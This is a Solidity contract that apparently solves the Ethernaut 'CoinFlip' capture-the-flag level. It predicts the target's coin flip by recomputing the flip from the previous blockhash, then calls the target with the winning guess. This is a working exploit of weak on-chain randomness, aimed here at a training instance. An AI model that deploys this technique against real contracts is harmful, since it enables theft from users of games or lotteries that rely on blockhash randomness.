// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x0506f165f10b1A67abf843FB81CD99eaEE68be7B

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

// deploy contract (using Remix IDE) and call the flip() function

contract HackCoinFlip {
    CoinFlip public coinFlipContract = CoinFlip(0x0506f165f10b1A67abf843FB81CD99eaEE68be7B);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
